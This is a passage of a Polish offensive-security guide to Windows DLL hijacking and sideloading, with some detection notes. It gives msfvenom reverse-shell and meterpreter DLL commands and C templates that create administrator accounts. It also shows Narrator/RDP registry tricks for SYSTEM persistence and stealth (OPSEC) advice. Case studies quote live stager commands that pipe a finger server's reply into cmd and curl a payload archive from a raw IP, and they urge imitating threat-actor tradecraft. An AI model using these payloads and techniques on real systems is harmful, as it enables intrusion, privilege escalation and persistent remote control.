- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub boczny) i któremu **brakuje DLL**.
- Upewnij się, że masz **uprawnienia do zapisu** w dowolnym **katalogu**, w którym będzie wyszukiwany **DLL**. Może to być katalog pliku wykonywalnego lub katalog w ścieżce systemowej.

Te warunki wstępne rzadko występują domyślnie: uprzywilejowanym plikom wykonywalnym zwykle nie brakuje zależności DLL, a zwykli użytkownicy zazwyczaj nie mogą zapisywać w katalogach ze ścieżki wyszukiwania systemu. Błędnie skonfigurowane środowiska mogą jednak ujawnić oba te problemy.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Choć jego głównym celem jest UAC bypass, zawiera PoC DLL hijacking dla określonych wersji Windows, które często można dostosować do znalezionego przez siebie zapisywalnego katalogu.

Zwróć uwagę, że możesz **sprawdzić swoje uprawnienia do folderu** za pomocą:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **sprawdź uprawnienia wszystkich katalogów w PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Możesz też sprawdzić importy pliku wykonywalnego i eksporty biblioteki DLL za pomocą:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Pełny przewodnik o tym, jak **nadużyć DLL Hijacking, aby eskalować uprawnienia** dzięki możliwości zapisu w **folderze System Path**, znajdziesz tutaj:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze w systemowym PATH.\
Inne przydatne zautomatyzowane narzędzia do wykrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

Jeśli znajdziesz scenariusz, który można wykorzystać, jedną z najważniejszych rzeczy niezbędnych do skutecznego wykorzystania go będzie **utworzenie DLL eksportującej co najmniej wszystkie funkcje, które plik wykonywalny będzie z niej importował**. Warto jednak zauważyć, że DLL Hijacking przydaje się do [eskalacji z poziomu Medium Integrity do High **(z pominięciem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład pokazujący, **jak utworzyć prawidłową DLL**, znajdziesz w tym opracowaniu na temat DLL Hijacking wykorzystywanego do uruchamiania kodu: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych kodów DLL**, które mogą przydać się jako **szablony** lub do utworzenia **DLL eksportującej nieobowiązkowe funkcje**.

## **Creating and compiling DLLs**

### **DLL Proxifying**

Zasadniczo **DLL proxy** to DLL, która może **wykonać twój złośliwy kod po załadowaniu**, a jednocześnie **udostępniać** funkcje i **działać** zgodnie z **oczekiwaniami**, przekazując wszystkie wywołania do prawdziwej biblioteki.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz poddać proxyfikacji, a następnie **wygenerować proxified DLL**; możesz też **wskazać DLL** i **wygenerować proxified DLL**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Uzyskaj meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Utwórz użytkownika (x86, nie widziałem wersji x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Własny

W wielu przypadkach skompilowana DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozpoznać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon DLL w C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatywna biblioteka DLL C z punktem wejścia wątku</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT DLL z inicjalizacją wyzwalaną przez eksport

Samowystarczalna **biblioteka współdzielona .NET NativeAOT** może służyć jako podstawiona natywna biblioteka DLL bez implementowania jawnego `DllMain`. Wyeksportuj statyczne metody C# za pomocą `[UnmanagedCallersOnly(EntryPoint = "...")]`; gdy natywny host wywoła jeden z tych wygenerowanych przez kompilator punktów wejścia, NativeAOT zainicjalizuje moduł, a metoda `[ModuleInitializer]` uruchomi się przed kodem wyeksportowanej metody C#. Wynik nie wymaga osobno zainstalowanego środowiska uruchomieniowego .NET.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

Biblioteka DLL nadal wymaga **nazw eksportów i sygnatur zgodnych z ABI**, których faktycznie używa wybrany host. Minimalne funkcje zastępcze mogą wystarczyć do wyzwolenia inicjalizacji, ale brakujące eksporty mogą uniemożliwić załadowanie biblioteki, a nieprawidłowa sygnatura może uszkodzić wywołanie. Wylicz importy hosta i zweryfikuj wynik za pomocą `dumpbin /exports payload.dll`, zanim zmienisz nazwę pliku wyjściowego na nazwę zależności oczekiwaną przez hosta.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimalna wyeksportowana biblioteka DLL NativeAOT</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Skonfiguruj projekt jako samodzielną natywną bibliotekę współdzieloną systemu Windows:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Umieść przemianowaną bibliotekę DLL obok skopiowanego, podatnego pliku wykonywalnego i uruchom hosta ścieżką kodu, która wywołuje zgodny eksport. To podejście z inicjalizatorem pozwala uniknąć umieszczania złożonych działań bezpośrednio w `DllMain`, ale warunki wstępne sideloadingu pozostają bez zmian: loader musi rozwiązywać zależność na podstawie nazwy, wybrać katalog aplikacji i nie może najpierw znaleźć jej w KnownDLLs, w już załadowanym module, przez przekierowanie SxS ani przy użyciu ograniczających flag `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Klasyczne szablony natywne znajdziesz w sekcji [Windows C payloads](../windows-c-payloads.md). Sideloadowany first stage może następnie wykonać [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), ale jest to odrębna technika wstrzykiwania, a nie część rozwiązywania nazw bibliotek DLL.

## Wykrywanie: ładowanie bibliotek przez DLL masquerading

Elastic Defend 9.5.0 wzbogaca zdarzenie ładowania biblioteki o `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"`, gdy załadowany plik nie jest podpisany przez Microsoft, a jego nazwa koliduje z buforowanym wykazem nazw bibliotek DLL systemu Windows/systemowych w Elastic. Dzięki temu analiza wykazu nazw plików, lokalizacji systemowych i podpisów odbywa się w sensorze endpointu, a podstawowe zapytanie EQL można uprościć do:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Traktuj wzbogacenie danych jako wartościowy punkt wyjścia do dalszej analizy, a nie jako samodzielny dowód. Zwiększ poziom pewności, gdy podpisany host ładuje DLL z własnego **katalogu z prawem zapisu dla użytkownika**, DLL jest niepodpisana lub niezaufana, a `dll.Ext.relative_file_creation_time` wskazuje, że utworzono ją krótko przed załadowaniem. Wykluczenia ogranicz do dokładnej kombinacji wydawcy, procesu hosta i ścieżki instalacji; nie pomijaj globalnie kolidującej nazwy DLL, ponieważ legalne instalatory i aplikacje mogą dostarczać własne biblioteki o nazwach przypominających nazwy systemowe.<sup>[[26]](#references)</sup>

Na sensorach bez tych wzbogaconych danych przybliż to zachowanie, korelując kolidującą nazwę DLL z nieścieżką systemową, brakiem podpisu Microsoft lub niezaufanym podpisem oraz krótkim odstępem między utworzeniem pliku a jego załadowaniem. Wymaga to aktualizowanego spisu nazw DLL i wąskich wykluczeń dla `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` oraz innych zatwierdzonych ścieżek wdrażania.<sup>[[26]](#references)</sup>

## Studium przypadku: Hijack DLL lokalizacji TTS Narrator OneCore (ułatwienia dostępu/ATs)

Windows Narrator.exe nadal przy uruchamianiu sprawdza przewidywalną, zależną od języka bibliotekę DLL lokalizacji, którą można przejąć w celu wykonania dowolnego kodu i zapewnienia trwałości.<sup>[[7]](#references)</sup>

Kluczowe fakty
- Ścieżka sprawdzania (obecne kompilacje): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze kompilacje): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli pod ścieżką OneCore znajduje się zapisywalna DLL kontrolowana przez atakującego, zostaje załadowana i wykonywane jest `DllMain(DLL_PROCESS_ATTACH)`. Nie są wymagane żadne eksporty.

Wyszukiwanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narratora i zaobserwuj próbę załadowania powyższej ścieżki.

Minimalna DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Cisza OPSEC
- Naiwny hijack spowoduje wyświetlenie komunikatu/podświetlenie interfejsu. Aby działać po cichu, po dołączeniu wylicz wątki Narratora, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajdziesz w PoC.<sup>[[8]](#references)</sup>

Wyzwalanie i utrwalanie przez konfigurację ułatwień dostępu
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Po wykonaniu powyższych poleceń uruchomienie Narratora załaduje podłożoną DLL. Na bezpiecznym pulpicie (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.

Wykonanie SYSTEM wyzwalane przez RDP (ruch boczny)
- Zezwól na klasyczną warstwę zabezpieczeń RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.
- Wykonywanie zostanie przerwane po zamknięciu sesji RDP — niezwłocznie wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego narzędzia ułatwień dostępu (AT), np. CursorIndicator, edytować go tak, by wskazywał dowolny plik binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Pozwala to uruchamiać dowolny kod za pośrednictwem platformy ułatwień dostępu.

Uwagi
- Zapis w `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Studium przypadku: CVE-2025-1729 - Podniesienie uprawnień za pomocą TPQMAssistant.exe

Ten przypadek przedstawia **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzone jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajduje się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zaplanowane zadanie**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia katalogu**: Zapis do katalogu ma `CREATOR OWNER`, co pozwala użytkownikom lokalnym umieszczać w nim dowolne pliki.
- **Zachowanie wyszukiwania DLL**: Program najpierw próbuje załadować `hostfxr.dll` z katalogu roboczego i rejestruje „NAME NOT FOUND”, jeśli pliku brakuje, co wskazuje na pierwszeństwo wyszukiwania w katalogu lokalnym.

### Implementacja exploita

Atakujący może umieścić złośliwy plik `hostfxr.dll` w tym samym katalogu, wykorzystując brakującą DLL do uzyskania wykonania kodu w kontekście użytkownika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli podczas wykonywania zadania zalogowany jest administrator, złośliwa biblioteka DLL uruchomi się w sesji administratora z poziomem integralności medium.
4. Połącz standardowe techniki obejścia UAC, aby podnieść uprawnienia z poziomu integralności medium do uprawnień SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading przez podpisany host (wsc_proxy.exe)

Podmioty stanowiące zagrożenie często łączą droppery oparte na MSI z DLL side-loading, aby uruchamiać payloady w zaufanym, podpisanym procesie.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się po cichu podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), odtwarzając kolejny etap z osadzonych zasobów.
- Dropper zapisuje w tym samym katalogu prawidłowy, podpisany plik EXE oraz złośliwą bibliotekę DLL (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego pliku EXE kolejność wyszukiwania bibliotek DLL w systemie Windows powoduje najpierw załadowanie wsc.dll z katalogu roboczego, co uruchamia kod atakującego w podpisanym procesie nadrzędnym (ATT&CK T1574.001).

Analiza MSI (na co zwrócić uwagę)
- Tabela CustomAction:
  - Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykład podejrzanego wzorca: LaunchApplication uruchamiający plik osadzony w tle.
  - W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w pliku CAB MSI:
  - Wypakowanie administracyjne: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Możesz też użyć lessmsi: lessmsi x package.msi C:\out
  - Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction VBScript. Typowy przebieg:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktyczny sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
  - wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
  - wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- W przypadku wymaganych eksportów użyj frameworka proxy (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który również uruchamia Twój payload.

- Ta technika polega na rozwiązywaniu nazw DLL przez plik binarny hosta. Jeśli host używa ścieżek bezwzględnych lub bezpiecznych flag ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na kolejność wyszukiwania i należy je uwzględnić przy wyborze pliku binarnego hosta oraz zestawu eksportów.

## Podpisane triady + zaszyfrowane payloady (studium przypadku ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad za pomocą **triady trzech plików**, by upodobnić się do legalnego oprogramowania, a jednocześnie przechowywać główny payload w postaci zaszyfrowanej na dysku:<sup>[[12]](#references)</sup>

1. **Podpisany plik EXE hosta** – nadużywa się oprogramowania dostawców takich jak AMD, Realtek lub NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego tak, by przypominał plik binarny Windows (np. `conhost.exe`), ale podpis Authenticode pozostaje prawidłowy.
2. **Złośliwy loader DLL** – umieszczany obok pliku EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL to zazwyczaj binarny plik MFC zaciemniony za pomocą frameworka ScatterBrain; jego jedynym zadaniem jest odnalezienie zaszyfrowanego bloba, odszyfrowanie go i wykonanie refleksyjnego mapowania ShadowPad.
3. **Zaszyfrowany blob payloadu** – często przechowywany w tym samym katalogu jako `<name>.tmp`. Po zmapowaniu odszyfrowanego payloadu w pamięci loader usuwa plik TMP, by zniszczyć ślady kryminalistyczne.

Uwagi dotyczące tradecraftu:

* Zmiana nazwy podpisanego pliku EXE (przy zachowaniu oryginalnej wartości `OriginalFileName` w nagłówku PE) pozwala mu podszywać się pod plik binarny Windows, a jednocześnie zachować podpis dostawcy. Naśladuj więc praktykę Ink Dragon polegającą na umieszczaniu plików przypominających `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ plik wykonywalny pozostaje zaufany, w przypadku większości mechanizmów allowlistingu wystarczy, że złośliwy DLL będzie znajdować się obok niego. Skup się na dostosowaniu loader DLL; podpisany plik nadrzędny zazwyczaj może działać bez zmian.
* Deszyfrator ShadowPad oczekuje, że blob TMP będzie znajdować się obok loadera i będzie zapisywalny, aby po mapowaniu mógł wyzerować plik. Pozostaw katalog zapisywalny do czasu załadowania payloadu; po umieszczeniu go w pamięci plik TMP można bezpiecznie usunąć ze względów OPSEC.

### Stager LOLBAS + łańcuch sideloadingu archiwum etapowego (Finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, dzięki czemu jedynym niestandardowym artefaktem na dysku jest złośliwy DLL znajdujący się obok zaufanego pliku EXE:<sup>[[1]](#references)</sup>

- **Loader zdalnych poleceń (Finger):** ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z serwera Finger i przekazuje je do `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, umożliwiając operatorom rotowanie drugiego etapu po stronie serwera.

- **Wbudowane pobieranie i rozpakowywanie:** Pobierz archiwum z nieszkodliwym rozszerzeniem, rozpakuj je i umieść plik docelowy do sideloadingu oraz DLL w losowym folderze `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows narzędzia tar.

- **Uruchamianie przez WMI/CIM:** Uruchom EXE za pomocą WMI, aby telemetria wykazała proces utworzony przez CIM podczas ładowania sąsiadującej z nim biblioteki DLL:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Działa z plikami binarnymi, które preferują lokalne DLL-e (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Wykrywanie:** Generuj alerty dla `forfiles`, gdy jednocześnie pojawią się `/p`, `/m` i `/c`; poza skryptami administratorów takie użycie jest rzadkie.


## Studium przypadku: dropper NSIS + sideloading Bitdefender Submission Wizard (Chrysalis)

Podczas niedawnego włamania przypisywanego Lotus Blossom nadużyto zaufanego łańcucha aktualizacji, aby dostarczyć dropper spakowany w NSIS, który przygotowywał sideloading DLL oraz payloady działające w całości w pamięci.<sup>[[13]](#references)</sup>

Przebieg działań
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, umieszcza tam przemianowany plik Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy plik `log.dll` i zaszyfrowany blob `BluetoothService`, a następnie uruchamia plik EXE.
- Plik hosta importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` ładuje blob przez mmap; `LogWrite` odszyfrowuje go za pomocą niestandardowego strumienia opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor tekstem jawnym zawierającym shellcode, zwalnia zmienne tymczasowe i przekazuje mu sterowanie.
- Aby uniknąć IAT, loader rozwiązuje API, haszując nazwy eksportów przy użyciu **bazy FNV-1a 0x811C9DC5 + liczby pierwszej 0x1000193**, a następnie stosując operację mieszającą w stylu Murmur (**0x85EBCA6B**) i porównując wynik z docelowymi hashami z solą.

Główny shellcode (Chrysalis)
- Odszyfrowuje główny moduł przypominający PE, powtarzając operacje dodawania/XOR/odejmowania z kluczem `gQ2JR&9;` w pięciu przebiegach, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odtwarza nazwy DLL-i w czasie działania za pomocą transformacji bitowego obrotu/XOR dla każdego znaku, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą tablicę eksportów w blokach po 4 bajty, stosując mieszanie w stylu Murmur, i używa `GetProcAddress` tylko wtedy, gdy hash nie zostanie znaleziony.

Osadzona konfiguracja i C2
- Konfiguracja znajduje się w zrzuconym pliku `BluetoothService` pod **offsetem 0x30808** (rozmiar **0x980**) i jest odszyfrowywana RC4 z kluczem `qwhvb^435h&*7`, co ujawnia URL C2 i User-Agent.
- Beacony tworzą profil hosta z elementami rozdzielonymi kropkami, dodają na początku tag `4Q`, a następnie szyfrują go RC4 kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane RC4 i przekazywane dalej na podstawie przełącznika tagów (`4T` — shell, `4V` — uruchomienie procesu, `4W/4X` — zapis pliku, `4Y` — odczyt/eksfiltracja, `4\\` — odinstalowanie, `4` — enumeracja dysków/plików i przypadki transferu porcjowanego).
- Tryb działania jest uzależniony od argumentów CLI: brak argumentów = instalacja mechanizmu trwałości (usługa/klucz Run) wskazującego na `-i`; `-i` uruchamia ponownie własny proces z `-k`; `-k` pomija instalację i uruchamia payload.

Zaobserwowany alternatywny loader
- Podczas tego samego włamania zrzucono Tiny C Compiler i uruchomiono `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, mając obok plik `libtcc.dll`. Dostarczony przez atakującego kod źródłowy C zawierał shellcode, który skompilowano i uruchomiono w pamięci, bez zapisywania pliku PE na dysku. Można to odtworzyć za pomocą:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ten etap kompilacji i uruchomienia oparty na TCC importował `Wininet.dll` w czasie wykonywania i pobierał shellcode drugiego etapu z zakodowanego na stałe URL-a, zapewniając elastyczny loader podszywający się pod uruchomienie kompilatora.

## Sideloading zaufanego hosta z proxy eksportów + wstrzymaniem wątku hosta

Niektóre łańcuchy DLL sideloading dodają **mechanizmy zapewniające stabilność**, dzięki którym legalny host pozostaje aktywny wystarczająco długo, by poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej DLL.<sup>[[11]](#references)</sup>

Zaobserwowany wzorzec
- Umieść zaufany plik EXE obok złośliwej DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa DLL **proxy’uje każdy oczekiwany eksport** do prawdziwej systemowej DLL (na przykład `%SystemRoot%\\System32\\version.dll`), dzięki czemu rozwiązywanie importów nadal działa, a proces hosta pozostaje sprawny.
- Po załadowaniu złośliwa DLL **modyfikuje punkt wejścia hosta**, tak aby główny wątek wpadał w nieskończoną pętlę `Sleep`, zamiast zakończyć działanie lub wykonywać ścieżki kodu, które zamknęłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę DLL kolejnego etapu (często używane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Dlaczego to ważne
- Standardowe proxy’owanie DLL zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo, by załadować kolejne etapy.
- Wstrzymanie głównego wątku w `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu podczas gdy loader wykonuje deszyfrowanie, przygotowuje kolejne etapy lub inicjuje połączenie sieciowe w wątku roboczym.
- Analiza wyłącznie podejrzanej funkcji `DllMain` może nie wykryć tego wzorca, jeśli istotne działania następują po zmodyfikowaniu punktu wejścia hosta i uruchomieniu wątku pomocniczego.

Minimalny przebieg
1. Skopiuj podpisany plik EXE hosta i ustal, jaką DLL wyszukuje w katalogu lokalnym.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą wywołania do legalnej DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z tego wątku zmodyfikuj punkt wejścia hosta lub procedurę startową głównego wątku tak, aby wykonywał pętlę `Sleep`.
5. Odszyfruj nazwę/konfigurację DLL kolejnego etapu i wywołaj `LoadLibrary` albo ręcznie zmapuj payload.

Wskazówki do wykrywania
